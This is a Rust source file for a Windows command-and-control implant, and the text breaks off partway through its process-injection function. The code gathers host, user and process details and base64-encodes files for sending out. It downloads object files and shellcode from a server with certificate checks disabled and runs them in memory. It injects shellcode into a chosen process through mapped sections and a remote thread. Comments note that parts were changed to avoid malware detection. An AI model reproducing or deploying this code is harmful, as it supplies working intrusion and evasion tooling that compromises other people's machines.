#![allow(non_snake_case)]
#![allow(unused_assignments)]
#![allow(non_camel_case_types)]
#![allow(unused_variables)]

extern crate windows_sys as windows;
use base64::{
    alphabet,
    engine::{self, general_purpose},
    Engine as _,
};
use ntapi::{
    ntldr::{LdrGetDllHandle, LdrGetProcedureAddress},
    ntmmapi::SECTION_INHERIT,
    ntpsapi::PPS_APC_ROUTINE,
    ntrtl::{RtlInitUnicodeString, RtlUnicodeStringToAnsiString},
};
use std::ffi::{c_void, OsStr};
use std::ffi::{CString, OsString};
use std::fs::File;
use std::io::{Read, Write};
use std::mem;
use std::os::windows::ffi::OsStrExt;
use std::os::windows::ffi::OsStringExt;
use std::ptr::null_mut;
use winapi::{
    ctypes::{c_char, c_void as winapi_void},
    shared::{
        basetsd::{PSIZE_T, SIZE_T, ULONG_PTR},
        minwindef::{BOOL, DWORD, FARPROC, HMODULE, LPVOID, PULONG, ULONG},
        ntdef::{
            ANSI_STRING, BOOLEAN, HANDLE, NTSTATUS, PHANDLE, PLARGE_INTEGER, POBJECT_ATTRIBUTES,
            PVOID, STRING, UNICODE_STRING,
        },
        ntstatus::STATUS_SUCCESS,
    },
    um::{
        minwinbase::LPTHREAD_START_ROUTINE,
        winnt::{
            ACCESS_MASK, LARGE_INTEGER, MAXIMUM_ALLOWED, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE,
            PAGE_READWRITE, SECTION_MAP_EXECUTE, SECTION_MAP_READ, SECTION_MAP_WRITE, SEC_COMMIT,
        },
    },
};
use windows::Win32::Networking::WinInet::{
    INTERNET_FLAG_RELOAD, INTERNET_OPEN_TYPE_DIRECT, INTERNET_SERVICE_HTTP,
};

use coffee_ldr::loader::Coffee;
use reqwest::blocking::Client;

// This function retrieves a handle to a DLL module.
// The function takes a DLL name as a string and returns a handle to the DLL module.
fn ldr_get_dll(dll_name: &str) -> HMODULE {
    // Initialize a null pointer to a handle.
    let mut handle: *mut winapi_void = std::ptr::null_mut();
    // Initialize a UNICODE_STRING structure to hold the DLL name.
    let mut unicode_string = UNICODE_STRING {
        Length: 0,
        MaximumLength: 0,
        Buffer: std::ptr::null_mut(),
    };
    // Convert the DLL name to a wide string.
    let dll_name_wide: Vec<u16> = OsStr::new(dll_name).encode_wide().chain(Some(0)).collect();
    unsafe {
        // Initialize the UNICODE_STRING structure with the DLL name.
        RtlInitUnicodeString(&mut unicode_string, dll_name_wide.as_ptr());
        // Call the LdrGetDllHandle function to get a handle to the DLL.
        let status = LdrGetDllHandle(
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            &mut unicode_string as *mut UNICODE_STRING,
            &mut handle,
        );
        // If the function call was not successful or the handle is null, return a null pointer.
        if status != STATUS_SUCCESS || handle.is_null() {
            return std::ptr::null_mut();
        }
    }
    // Return the handle to the DLL module.
    handle as HMODULE
} //ldr_get_dll

// This function retrieves the address of an exported function from a DLL module.
// The function takes a handle to a DLL module and a function name as a string, and returns a pointer to the function.
fn ldr_get_fn(dll: HMODULE, fn_name: &str) -> FARPROC {
    // Initialize a null pointer to a function.
    let mut func: *mut winapi_void = std::ptr::null_mut();
    // Initialize a STRING structure to hold the function name.
    let mut ansi_string = STRING {
        Length: 0,
        MaximumLength: 0,
        Buffer: std::ptr::null_mut(),
    };
    // Initialize a UNICODE_STRING structure to hold the function name.
    let mut unicode_string = UNICODE_STRING {
        Length: 0,
        MaximumLength: 0,
        Buffer: std::ptr::null_mut(),
    };
    // Convert the function name to a wide string.
    let fn_name_wide: Vec<u16> = OsStr::new(fn_name).encode_wide().chain(Some(0)).collect();
    unsafe {
        // Initialize the UNICODE_STRING structure with the function name.
        RtlInitUnicodeString(&mut unicode_string, fn_name_wide.as_ptr());
        // Convert the UNICODE_STRING to an ANSI string.
        RtlUnicodeStringToAnsiString(&mut ansi_string, &unicode_string, 1);
        // Call the LdrGetProcedureAddress function to get the address of the function.
        let status = LdrGetProcedureAddress(
            dll as *mut winapi_void,
            &mut ansi_string as *mut STRING,
            0,
            &mut func,
        );
        // If the function call was not successful or the function pointer is null, return a null pointer.
        if status != STATUS_SUCCESS || func.is_null() {
            return std::ptr::null_mut();
        }
    }
    // Return the pointer to the function.
    func as FARPROC
} //ldr_get_fn

// This function retrieves the version of the Windows operating system.
//this function needs address of ntdll
pub fn get_version(module_name: *const c_void) -> String {
    //lets try modifying get_version as a test case, to replace ldr_get_dll and ldr_get_fn with functions from noldr module
    // Use ldr_get_dll to dynamically load the ntdll.dll module.
    //let module_name = ldr_get_dll("ntdll.dll");
    //let module_name = nodlr::get_dll_address("ntdll.dll");
    // Use ldr_get_fn to get the address of the RtlGetVersion function from the ntdll.dll module.
    //let proc = ldr_get_fn(module_name, "RtlGetVersion");

    let proc =
        noldr::get_function_address(module_name, "RtlGetVersion").unwrap_or_else(|| std::ptr::null_mut());

    if proc.is_null() {
        "Unknown".to_string()
    } else {
        // Cast the address of the RtlGetVersion function to the appropriate function pointer type.
        let rtl_get_version: unsafe extern "system" fn(
            *mut windows::Win32::System::SystemInformation::OSVERSIONINFOW,
        ) -> u32 = unsafe { mem::transmute(proc) };

        // Initialize an OSVERSIONINFOW structure to receive the version information.
        let mut version_info = windows::Win32::System::SystemInformation::OSVERSIONINFOW {
            dwOSVersionInfoSize: std::mem::size_of::<
                windows::Win32::System::SystemInformation::OSVERSIONINFOW,
            >() as u32,
            dwMajorVersion: 0,
            dwMinorVersion: 0,
            dwBuildNumber: 0,
            dwPlatformId: 0,
            szCSDVersion: [0; 128],
        };

        // Call the RtlGetVersion function to get the version information.
        let status = unsafe { rtl_get_version(&mut version_info) };

        // If the function call was successful (status == 0), format and return the version information.
        // Otherwise, return "Unknown".
        if status == 0 {
            return format!(
                "Windows {}.{}.{}",
                version_info.dwMajorVersion,
                version_info.dwMinorVersion,
                version_info.dwBuildNumber
            );
        } else {
            return "Unknown".to_string();
        }
    }
} //get_version

// This function reads a file and encodes its content using a custom encoding engine.
// The encoded content is returned as a string.
pub fn read_and_encode(args: Vec<&str>) -> String {
    // Define a custom encoding engine using the URL-safe alphabet and no padding.
    const CUSTOM_ENGINE: engine::GeneralPurpose =
        engine::GeneralPurpose::new(&alphabet::URL_SAFE, general_purpose::NO_PAD);

    // Initialize the file path. If there are more than one arguments, use the second one as the file path.
    let mut file_path = "";
    if args.len() > 1 {
        file_path = args[1];
    }

    // Try to open the file. If it fails, return an error message.
    let mut file = match File::open(file_path) {
        Ok(file) => file,
        Err(e) => return format!("Error opening file: {}", e),
    };

    // Initialize a buffer to hold the file content.
    let mut buffer = Vec::new();

    // Try to read the file content into the buffer. If it fails, return an error message.
    if let Err(e) = file.read_to_end(&mut buffer) {
        return format!("Error reading file: {}", e);
    }

    // Encode the file content using the custom encoding engine.
    let content = CUSTOM_ENGINE.encode(&buffer);

    // Return the encoded content.
    content
} //read_and_encode

pub fn encode(data: &[u8]) -> String {
        // Define a custom encoding engine using the URL-safe alphabet and no padding.
        const CUSTOM_ENGINE: engine::GeneralPurpose =
        engine::GeneralPurpose::new(&alphabet::URL_SAFE, general_purpose::NO_PAD);

        // Encode the data using the custom encoding engine.
        let content = CUSTOM_ENGINE.encode(data);

        // Return the encoded content.
        content

}

pub fn decode(data: &str) -> Result<Vec<u8>, String> {
    // Define a custom encoding engine using the URL-safe alphabet and no padding.
    const CUSTOM_ENGINE: engine::GeneralPurpose =
        engine::GeneralPurpose::new(&alphabet::URL_SAFE, engine::general_purpose::NO_PAD);

    // Decode the data using the custom encoding engine.
    let content_res = CUSTOM_ENGINE.decode(data);

    // Handle the result and return the decoded content or an error.
    match content_res {
        Ok(content) => Ok(content),
        Err(e) => Err(format!("Error decoding data: {}", e)),
    }
}

// This function reads a file and decodes its content using a custom decoding engine.
// The decoded content is written to a new file.
pub fn read_and_decode(args: Vec<&str>) -> String {
    const CUSTOM_ENGINE: engine::GeneralPurpose =
        engine::GeneralPurpose::new(&alphabet::URL_SAFE, general_purpose::NO_PAD);
    let mut file_path = "";
    if args.len() > 1 {
        file_path = args[1];
    }

    //the base64 encoded string of binary data is the 3rd string in the args array
    let encoded_content = args[2];
    //decode the base64 encoded string of binary data
    let buffer = CUSTOM_ENGINE.decode(encoded_content.as_bytes());
    //let content = CUSTOM_ENGINE.decode(&buffer);
    //write the decoded binary data to a file
    let mut file = match File::create(file_path) {
        Ok(file) => file,
        Err(e) => return format!("Error creating file: {}", e),
    };
    //convert the buffer from a Result to a Vec<u8>
    let buffer = match buffer {
        Ok(buffer) => buffer,
        Err(e) => return format!("Error decoding file: {}", e),
    };
    if let Err(e) = file.write_all(&buffer) {
        return format!("Error writing file: {}", e);
    }

    //return a string that says the file was written successfully

    let content = "File written successfully".to_string();

    content
}

// Function to get the hostname of the current machine
//this function needs address of kernel32
pub fn get_hostname(module_name: *const c_void) -> String {
    /*
    // This is an alternative way to get the computer name using GetComputerNameW function
    let mut name = [0; 256]; // Buffer to store the computer name
    let mut size = 256; // Size of the buffer
    unsafe {
        // Call the GetComputerNameW function to get the computer name
        windows::Win32::System::WindowsProgramming::GetComputerNameW(&mut name[0], &mut size);
    }
    // Convert the computer name from UTF-16 to a Rust String and return it
    String::from_utf16_lossy(&name[..size as usize])
    //hostname
    */

    // We are using ldr_get_dll and ldr_get_fn to dynamically load GetComputerNameExW

    // Load the kernel32.dll module
    //let module_name = ldr_get_dll("kernel32.dll");
    //let proc = noldr::get_function_address(mod1, "RtlGetVersion").unwrap();

    // If the module could not be loaded, return "Unknown"
    //if module_name.is_null() {
    //    return "Unknown".to_string();
    //}

    let proc = noldr::get_function_address(module_name, "GetComputerNameExW")
        .unwrap_or_else(|| std::ptr::null_mut());

    if proc.is_null() {
        "Unknown".to_string()
    } else {
        // Cast the function address to the correct type
        let get_computer_name_ex_w: unsafe extern "system" fn(
            windows::Win32::System::SystemInformation::COMPUTER_NAME_FORMAT,
            *mut u16,
            *mut u32,
        ) -> BOOL = unsafe { mem::transmute(proc) };

        // Buffer to store the computer name
        let mut name = [0; 256];
        // Size of the buffer
        let mut size = 256;

        // Call the GetComputerNameExW function to get the computer name
        let result = unsafe {
            get_computer_name_ex_w(
                windows::Win32::System::SystemInformation::ComputerNameDnsHostname,
                &mut name[0],
                &mut size,
            )
        };

        // If the function failed, return "Unknown"
        if result == 0 {
            return "Unknown".to_string();
        }

        // Convert the computer name from UTF-16 to a Rust String and return it
        String::from_utf16_lossy(&name[..size as usize])
    }
} //get_hostname

pub fn get_username() -> String {
    // Get the combined username and privileges
    let full_string = whoami::get_username_ntapi().unwrap();

    // Split the full string into a vector of strings
    let parts: Vec<&str> = full_string.split('\n').collect();

    // The first part is the username
    let username = parts[1].to_string();

    // Check if the user has admin privileges
    if parts[1..]
        .iter()
        .any(|&s| s.trim_end_matches('\0') == "SeTakeOwnershipPrivilege")
    {
        // If the user has admin privileges, append an asterisk to the username
        return format!("{}*", username);
    }

    username
}

// This function retrieves the name of the current process.
//this function needs address of kernel32
pub fn get_process_name(module_name: *const c_void) -> String {
    // Initialize a buffer to hold the process name.
    let mut buffer: Vec<u16> = vec![0; 1024];

    // Dynamically load the GetModuleFileNameW function from the kernel32.dll module.
    //let module_name = ldr_get_dll("kernel32.dll");
    // If get_function_address returns an Option<*const c_void>
    let proc = noldr::get_function_address(module_name, "GetModuleFileNameW")
        .unwrap_or_else(|| std::ptr::null_mut());

    if proc.is_null() {
        "Unknown".to_string()
    } else {
        // Cast the address of the GetModuleFileNameW function to the appropriate function pointer type.
        let get_module_filename_w: unsafe extern "system" fn(HMODULE, *mut u16, DWORD) -> DWORD =
            unsafe { mem::transmute(proc) };

        // Call the GetModuleFileNameW function to get the full path of the current process.
        unsafe {
            let result = get_module_filename_w(
                0 as _, // Get the name of the current process.
                buffer.as_mut_ptr(),
                buffer.len() as u32,
            );
            // If the function call fails, panic.
            if result == 0 {
                panic!("Failed to get the module file name");
            }
        }

        // Convert the buffer from wide characters to a string.
        let process_full_path = OsString::from_wide(&buffer)
            .into_string()
            .unwrap_or_else(|_| String::new());

        // Extract the process name from the full path by splitting the path on backslashes and taking the last component.
        let process_name = process_full_path
            .split("\\")
            .last()
            .unwrap_or(&process_full_path);

        // Return the process name.
        process_name.to_string()
    }
} //get_process_name

/* removing this because the call out to apify is getting flagged as a high indicator of malware
pub fn get_external_ip() -> String {
    /*
    This function, `get_external_ip`, is used to retrieve the external IP address of the current machine.
    It does this by making an HTTP GET request to the "api.ipify.org" server, which returns the public IP address of the
    client making the request.
    The function starts by defining some constants such as the user agent, server name, endpoint, and HTTP method.
    Next, it dynamically loads several functions from the "wininet.dll" library using the `ldr_get_dll` and `ldr_get_fn` functions.
    These functions include `InternetOpenA`, `InternetConnectA`, `HttpOpenRequestA`, `HttpSendRequestA`, `InternetReadFile`, and
    `InternetCloseHandle`.
    The function then transmutes these function pointers into the appropriate function types using `mem::transmute`.
    The `InternetOpenA` function is used to initialize an application's use of the WinINet functions. The `InternetConnectA`
    function is used to make a connection to the server. The `HttpOpenRequestA` function is used to create an HTTP request handle.
    The `HttpSendRequestA` function is used to send the HTTP request.
    If the request is successful, the function reads the response using the `InternetReadFile` function. The response is the
    public IP address of the client, which is stored in the `ip` string.
    Finally, the function closes the handles using the `InternetCloseHandle` function and returns the IP address.
    Note: This function uses unsafe Rust due to the direct use of Windows API and dynamic function loading.
    */
    let user_agent = CString::new("Mozilla/5.0").unwrap();
    let server_name = CString::new("api.ipify.org").unwrap();
    let endpoint = CString::new("").unwrap();
    let method = CString::new("GET").unwrap();

    //dynamic load of InternetOpenA, InternetConnectA, HttpOpenRequestA, HttpSendRequestA, InternetReadFile, InternetCloseHandle
    //using ldr_get_dll and ldr_get_fn

    let module_name = ldr_get_dll("wininet.dll");
    let h_internet = ldr_get_fn(module_name, "InternetOpenA");
    let h_connect = ldr_get_fn(module_name, "InternetConnectA");
    let h_request = ldr_get_fn(module_name, "HttpOpenRequestA");
    let h_send = ldr_get_fn(module_name, "HttpSendRequestA");

    let h_internet: unsafe extern "system" fn(*const i8, i32, *const i8, *const i8, u32) -> HANDLE =
        unsafe { mem::transmute(h_internet) };
    let h_connect: unsafe extern "system" fn(
        HANDLE,
        *const i8,
        u16,
        *const i8,
        *const i8,
        i32,
        u32,
        u32,
    ) -> HANDLE = unsafe { mem::transmute(h_connect) };
    let h_request: unsafe extern "system" fn(
        HANDLE,
        *const i8,
        *const i8,
        *const i8,
        *const i8,
        *const i8,
        u32,
        u32,
    ) -> HANDLE = unsafe { mem::transmute(h_request) };
    let h_send: unsafe extern "system" fn(HANDLE, *const i8, i32, *mut c_void, u32) -> BOOL =
        unsafe { mem::transmute(h_send) };

    let h_internet = unsafe {
        h_internet(
            user_agent.as_ptr() as *const i8,
            (INTERNET_OPEN_TYPE_DIRECT as i32).try_into().unwrap(),
            null_mut(),
            null_mut(),
            0,
        )
    };

    let h_connect = unsafe {
        h_connect(
            h_internet,
            server_name.as_ptr() as *const i8,
            80, //443 for https, 80 for http
            null_mut(),
            null_mut(),
            (INTERNET_SERVICE_HTTP as i32).try_into().unwrap(),
            0,
            0,
        )
    };

    let h_request = unsafe {
        h_request(
            h_connect,
            method.as_ptr() as *const i8,
            endpoint.as_ptr() as *const i8,
            null_mut(),
            null_mut(),
            null_mut(),
            INTERNET_FLAG_RELOAD,
            0,
        )
    };

    let res = unsafe { h_send(h_request, null_mut() as *const i8, 0, null_mut(), 0) };

    let mut buffer = [0; 1024];
    let mut bytes_read = 0;
    let mut ip = String::new();

    if res == 0 {
        //println!("Request failed.");
    } else {
        //dynamic load of InternetReadFile using ldr_get_dll and ldr_get_fn
        let module_name = ldr_get_dll("wininet.dll");
        let h_read = ldr_get_fn(module_name, "InternetReadFile");
        let h_read: unsafe extern "system" fn(HANDLE, *mut c_void, u32, *mut u32) -> BOOL =
            unsafe { mem::transmute(h_read) };

        unsafe {
            while h_read(
                h_request,
                buffer.as_mut_ptr() as *mut c_void,
                buffer.len() as u32,
                &mut bytes_read,
            ) != 0
                && bytes_read != 0
            {
                ip.push_str(&String::from_utf8_lossy(&buffer[..bytes_read as usize]));
            }
        }
    }

    //dynamic load of InternetCloseHandle using ldr_get_dll and ldr_get_fn
    let module_name = ldr_get_dll("wininet.dll");
    let h_close = ldr_get_fn(module_name, "InternetCloseHandle");
    let h_close: unsafe extern "system" fn(HANDLE) -> BOOL = unsafe { mem::transmute(h_close) };

    unsafe { h_close(h_request) };
    unsafe { h_close(h_connect) };
    unsafe { h_close(h_internet) };

    ip
} //http version
*/

pub fn get_external_ip() -> String {
    // Return a placeholder that the server will recognize and replace
    // Using a distinctive format that's unlikely to occur naturally
    String::from("{{SERVER_REPLACE_IP}}")
}

//this function will read a bof file from the server and execute it
pub fn read_and_exec(args: Vec<&str>, server: String, imp_token: String) -> String {
    //initialize file_path variable
    let mut file_path = "";
    //if the args array has more than 1 element, set file_path to the 2nd element in the array
    if args.len() > 1 {
        file_path = args[1];
    }

    //print file_path for debug
    //println!("File Path: {:?}", file_path);

    //perform download of the binary data from the server /download endpoint, sending the filename as a header value
    //for x-filename

    //download the file from the server
    //when the download is complete, we'll keep the binary data in a buffer in memory

    //initialize variables for the request
    let user_agent = "Mozilla/5.0";
    let server_name = server; // The server name to download the file from
    let endpoint = format!("/download"); // The endpoint to download the file

    // Print server_name for debug
    //println!("Server Name: {:?}", server_name);

    //initialize file_content variable to store the binary data
    let mut file_content = Vec::new();

    //create a new reqwest client
    let client = Client::builder()
        .user_agent(user_agent)
        .danger_accept_invalid_certs(true)
        .build()
        .unwrap();

    //create the url to download the file from
    let url = format!("https://{}{}", server_name, endpoint);

    //send the request to download the file
    let mut response = client
        .get(&url)
        .header("X-Filename", file_path)
        .header("X-Session", imp_token)
        .send()
        .expect("Failed to send request");

    //check the response status
    if !response.status().is_success() {
        //println!("Request failed with status: {}", response.status());
    } else {
        response
            //read the response into the file_content buffer
            .read_to_end(&mut file_content)
            .expect("Failed to read response");
    }

    //convert the buffer to a slice of raw parts
    let buffer = unsafe { std::slice::from_raw_parts(file_content.as_ptr(), file_content.len()) };

    let args_clone = args.iter().map(|&s| s.to_string()).collect::<Vec<String>>();

    //create bofresult variable to store the result of the buffer execution
    let mut bofresult = String::new();

    //match the length of the args_clone array
    match args_clone.len() {
        /*n if n > 3 => {
            let bofargs_bytes = args_clone[2].as_bytes(); // Convert to &[u8]
            let bofargs = bofargs_bytes.as_ptr(); // Convert to Option<*const u8>
            let entry_point = args_clone[3].parse::<usize>().unwrap(); // Convert to usize (untested)

            let arg_size = args_clone[2].len(); // Convert to Option<usize>
            match Coffee::new(&buffer)
                .unwrap()
                .execute(Some(bofargs), Some(arg_size), Some(entry_point))
            {
                Ok(result) => {
                    bofresult = result;
                }
                Err(e) => {
                    bofresult = format!("Error: {:?}", e);
                }
            }
        }*/
        //if the args_clone array has more than 2 elements, execute the buffer with the 3rd element as the arguments
        n if n > 2 => {
            let bofargs_bytes = args_clone[2].as_bytes(); // Convert to &[u8]
            let bofargs = bofargs_bytes.as_ptr(); // Convert to Option<*const u8>
            let arg_size: usize = bofargs_bytes.len(); // Convert to Option<usize>
            match Coffee::new(&buffer)
                .unwrap()
                .execute(Some(bofargs), Some(arg_size), None)
            {
                Ok(result) => {
                    bofresult = result;
                    //println!("Result: {:?}", bofresult);
                }
                Err(e) => {
                    bofresult = format!("Error: {:?}", e);
                }
            }
        }
        //if the args_clone array has more than 1 element, execute the buffer with no arguments
        n if n > 1 => match Coffee::new(&buffer).unwrap().execute(None, None, None) {
            Ok(result) => {
                bofresult = result;
                //println!("Result: {:?}", bofresult);
            }
            Err(e) => {
                bofresult = format!("Error: {:?}", e);
            }
        },
        _ => {}
    }

    //return the result of the buffer execution
    let content = bofresult;
    //println!("Content: {:?}", content);

    //return the content
    content
} //read_and_exec

pub fn get_pid() -> String {
    std::process::id().to_string()
}

pub fn fake_get_external_ip() -> String {
    //this is a fake function to test the send_request function
    //its purpose is to return a fake ip address, so i can share gifs of the implant working without doxxing myself
    //it will be replaced with the real get_external_ip function when we are ready to test the implant
    String::from("xxx.xxx.xxx.xxx") //replace with real ip
}

pub fn read_and_exshellcode(args: Vec<&str>, server: String, imp_token: String) -> String {
    //initialize file_path variable
    let mut file_path = "";
    let mut pid = "";
    //if the args array has more than 1 element, set file_path to the 2nd element in the array
    if args.len() > 2 {
        pid = args[1];
        file_path = args[2];
    }

    //print file_path for debug
    //println!("File Path: {:?}", file_path);

    //print the pid for debug
    //println!("PID: {:?}", pid);

    //perform download of the binary data from the server /download endpoint, sending the filename as a header value
    //for x-filename

    //download the file from the server
    //when the download is complete, we'll keep the binary data in a buffer in memory

    //initialize variables for the request
    let user_agent = "Mozilla/5.0";
    let server_name = server; // The server name to download the file from
    let endpoint = format!("/download"); // The endpoint to download the file

    // Print server_name for debug
    //println!("Server Name: {:?}", server_name);

    //initialize file_content variable to store the binary data
    let mut file_content = Vec::new();

    //create a new reqwest client
    let client = Client::builder()
        .user_agent(user_agent)
        .danger_accept_invalid_certs(true)
        .build()
        .unwrap();

    //create the url to download the file from
    let url = format!("https://{}{}", server_name, endpoint);

    //send the request to download the file
    let mut response = client
        .get(&url)
        .header("X-Filename", file_path)
        .header("X-Session", imp_token)
        .send()
        .expect("Failed to send request");

    //check the response status
    if !response.status().is_success() {
        //println!("Request failed with status: {}", response.status());
    } else {
        response
            //read the response into the file_content buffer
            .read_to_end(&mut file_content)
            .expect("Failed to read response");
    }

    //convert the buffer to a slice of raw parts
    /*
    let buffer =
        unsafe { std::slice::from_raw_parts(file_content.as_ptr(), file_content.len()) };
    */
    //let args_clone = args.iter().map(|&s| s.to_string()).collect::<Vec<String>>();

    let buffer = file_content.clone();

    //create scoderesult variable to store the result of the buffer execution
    let scoderesult = String::new();

    //this is where we will execute the shellcode. leaving blank for now
    let scoderesult = exshellcode(pid, buffer);

    //return the result
    scoderesult
} //read_and_exshellcode

//this function needs address of ntdll and kernel32
fn injection(mut new_handle: HANDLE, scode: Vec<u8>) -> String {
    //read shellcode from file
    let SHELL_CODE = scode;

    //get the function pointer for NtCreateSection
    let ntdll_handle = ldr_get_dll(&lc!("ntdll.dll"));
    let getnext_func = ldr_get_fn(ntdll_handle, &lc!("NtCreateSection"));

    //define NtCreateSection function
    let NtCreateSection: unsafe fn(
        PHANDLE,
        ACCESS_MASK,
        POBJECT_ATTRIBUTES,
        PLARGE_INTEGER,
        ULONG,
        ULONG,
        HANDLE,
    ) -> NTSTATUS = unsafe { std::mem::transmute(getnext_func as FARPROC) };

    let mut section_handle: HANDLE = std::ptr::null_mut();
    //create a pointer to the section handle
    let p_section_handle: PHANDLE = &mut section_handle;

    let flags = SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE;

    let shell_size = SHELL_CODE.len() as i64; // get the length of the SHELL array and convert to i64

    let mut section_size: LARGE_INTEGER = unsafe { std::mem::zeroed() };
    unsafe {
        *section_size.QuadPart_mut() = shell_size * mem::size_of::<u8>() as i64;

        //print section size
        //println!("Section Size: {}", *section_size.QuadPart());
        //print section handle
        //println!("Section Handle: {:?}", p_section_handle);

        //call NtCreateSection
        let result: NTSTATUS = NtCreateSection(
            p_section_handle,
            flags,
            0 as _,
            &mut section_size as PLARGE_INTEGER,
            PAGE_EXECUTE_READWRITE,
            SEC_COMMIT, // SEC_COMMIT
            0 as _,
        );

        //check the result of the API call and handle any errors.

        if result != 0 {
            //println!("NtCreateSection Failed!");
            //println!("Error Code: {}", result);
            return "Failed to create section".to_string();
        }

        //now that we have a section handle, let's map it into the target process using NtMapViewOfSection

        //get the function pointer for NtMapViewOfSection
        let getnext_func = ldr_get_fn(ntdll_handle, &lc!("NtMapViewOfSection"));

        //define NtMapViewOfSection function
        let NtMapViewOfSection: unsafe fn(
            SectionHandle: HANDLE,
            ProcessHandle: HANDLE,
            BaseAddress: *mut PVOID,
            ZeroBits: ULONG_PTR,
            CommitSize: SIZE_T,
            SectionOffset: PLARGE_INTEGER,
            ViewSize: PSIZE_T,
            InheritDisposition: SECTION_INHERIT,
            AllocationType: ULONG,
            Win32Protect: ULONG,
        ) -> NTSTATUS = std::mem::transmute(getnext_func as FARPROC);

        //let mut section_size: LARGE_INTEGER = unsafe { std::mem::zeroed() };
        let mut large_integer: LARGE_INTEGER = std::mem::zeroed();
        //*section_size.QuadPart_mut() = shell_size * mem::size_of::<u8>() as i64;
        *large_integer.QuadPart_mut() = 0;
        let section_offset: PLARGE_INTEGER = &mut large_integer;

        let mut scbase: PVOID = std::ptr::null_mut();
        //get a pointer to the scbase
        let p_scbase: *mut PVOID = &mut scbase;

        //locate GetCurrentProcess function in kernel32.dll
        let kernel32_handle = ldr_get_dll(&lc!("kernel32.dll"));
        let getcurrentprocess_func = ldr_get_fn(kernel32_handle, &lc!("GetCurrentProcess"));

        //define GetCurrentProcess function
        let GetCurrentProcess: unsafe fn() -> HANDLE =
            std::mem::transmute(getcurrentprocess_func as FARPROC);

        //get current process handle by calling GetCurrentProcess
        let mut current_process_handle = GetCurrentProcess();
        //make a pointer to the current process handle
        let p_current_process_handle: PHANDLE = &mut current_process_handle;
        //println!("GetLastError: {}", unsafe { GetLastError() });
        //println!("Current Process Handle: {:?}", p_current_process_handle);

        //setup the maxsize equal to the size of the shell_size
        let mut maxsize: SIZE_T = shell_size as SIZE_T;

        let pmaxsize: PSIZE_T = &mut maxsize;

        //println!("maxsize: {:?}", maxsize);
        //println!("pmaxsize: {:?}", pmaxsize);

        //println!("section offset: {:x?}", section_offset);
        //println!("section handle: {:x?}", p_section_handle);

        //print scbase
        //println!("scbase: {:x?}", scbase);
        //print p_scb   ase
        //println!("p_scbase: {:x?}", p_scbase);
        //fNtMapViewOfSection(sectionHandle, GetCurrentProcess(), &localSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_READWRITE);
        let callresult = NtMapViewOfSection(
            *p_section_handle,
            *p_current_process_handle,
            p_scbase,
            0 as _,
            0 as _,
            section_offset,
            pmaxsize,
            2,
            0 as _,
            PAGE_READWRITE,
        );

        //setup a var to hold the base address of the section in the target process
        let mut scbase2: PVOID = std::ptr::null_mut();
        //make a pointer to scbase2
        let p_scbase2: *mut PVOID = &mut scbase2;

        //get pointer to new_handle
        let p_new_handle: *mut HANDLE = &mut new_handle;
        //print new handle
        //println!("New Handle: {:?}", new_handle);
        //print p_new_handle
        //println!("p_new_handle: {:?}", p_new_handle);

        //now let's map the section into the target process using NtMapViewOfSection
        let resultmapremote = NtMapViewOfSection(
            *p_section_handle,
            *p_new_handle,
            p_scbase2,
            0 as _,
            0 as _,
            section_offset,
            pmaxsize,
            2,
            0 as _,
            PAGE_EXECUTE_READ,
        );

        //now write the shellcode to the shared section
        //try using std::ptr::copy_nonoverlapping

        //get pointer to SHELL_CODE
        let p_shell_code: *const u8 = SHELL_CODE.as_ptr();

        let resultcopy =
            std::ptr::copy_nonoverlapping(p_shell_code, scbase as *mut u8, SHELL_CODE.len());

        //getlocalexportoffset from remote process using LdrGetDllHandle and LdrGetProcedureAddress
        //we want the remote thread start address offset from the base address of ntdll RtlExitUserThread

        // since we already have the ntdll handle, we can use it to get the address of RtlExitUserThread
        let getnext_func = ldr_get_fn(ntdll_handle, &lc!("RtlExitUserThread"));

        //define RtlExitUserThread function
        let RtlExitUserThread: unsafe fn() -> NTSTATUS =
            std::mem::transmute(getnext_func as FARPROC);

        //now we want to Create a suspended thread at Rtlexituserthread in remote process

        let hRemoteThread: HANDLE = std::ptr::null_mut();

        //function to get module base address for ntdll and fn RtlExitUserThread

        //locate the RtlInitUnicodeString function in ntdll.dll
        let getnext_func = ldr_get_fn(ntdll_handle, &lc!("RtlInitUnicodeString"));

        //define export_name so that it equals RtlExitUserThread
        let export_name = "RtlExitUserThread";

        let u_func_name = CString::new(export_name).unwrap();
        let mut u_func_string: UNICODE_STRING = std::mem::zeroed();
        RtlInitUnicodeString(&mut u_func_string, u_func_name.as_ptr() as *const u16);

        //locate teh RtlUnicodeStringToAnsiString function in ntdll.dll
        let getnext_func = ldr_get_fn(ntdll_handle, &lc!("RtlUnicodeStringToAnsiString"));

        //define RtlUnicodeStringToAnsiString function
        let RtlUnicodeStringToAnsiString: unsafe fn(
            DestinationString: *mut ANSI_STRING,
            SourceString: *mut UNICODE_STRING,
            AllocateDestinationString: i32,
        ) -> NTSTATUS = std::mem::transmute(getnext_func as FARPROC);

        //set a_func_name so it is equal to u_func_string
        let mut a_func_name: ANSI_STRING = std::mem::zeroed();

        //convert the unicode string to ansi

        let r: NTSTATUS = RtlUnicodeStringToAnsiString(
            &mut a_func_name,
            &mut u_func_string as *mut UNICODE_STRING,
            true as i32,
        );

        if r != 0 {
            //println!("[!] Failed to convert function name to ANSI..");
            return "Failed".to_string();
        }

        //print ntdll base address
        //println!("ntdll base address: {:x?}", ntdll_handle);

        let mut p_export: PVOID = std::ptr::null_mut();
        let func_name: *const c_char = a_func_name.Buffer as *const c_char;
        let call_result = ldr_get_fn(ntdll_handle, &lc!("RtlExitUserThread"));
        if call_result.is_null() {
            //println!("[!] Failed to get {} address..", export_name);
            return "Failed".to_string();
        } else {
            p_export = call_result as PVOID;

            //println!("    |-> {}: 0x{:X}", export_name, p_export as usize);
        }

        let func_offset = (p_export as isize) - (ntdll_handle as isize);
        //println!("    |-> Offset: 0x{:X}", func_offset);

        //calculate the address of the remote thread start address by adding the offset to the base address of ntdll
        let remote_thread_start_address = (ntdll_handle as usize + func_offset as usize) as LPVOID;

        //now we can create the remote thread

        //locate the NtCreateThreadEx function in ntdll.dll
        let getnext_func = ldr_get_fn(ntdll_handle, &lc!("NtCreateThreadEx"));

        //define NtCreateThreadEx function

        let NtCreateThreadEx: unsafe fn(
            ThreadHandle: PHANDLE,
            DesiredAccess: ACCESS_MASK,
            ObjectAttributes: POBJECT_ATTRIBUTES,
